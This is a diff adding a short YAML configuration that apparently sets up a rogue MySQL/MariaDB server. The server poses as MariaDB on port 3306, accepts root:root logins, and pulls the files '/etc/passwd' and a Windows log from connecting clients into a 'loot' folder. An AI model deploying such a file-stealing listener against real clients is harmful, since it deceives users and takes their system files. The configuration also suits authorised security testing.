@@ -1,0 +1,12 @@
+host: 0.0.0.0
+port: 3306
+version_string: "10.4.13-MariaDB-log"
+
+file_list: ["/etc/passwd", "C:/Windows/PFRO.log"]
+save_path: ./loot
+always_read: false
+
+auth: true
+users:
+  - root: root
+  - root: root
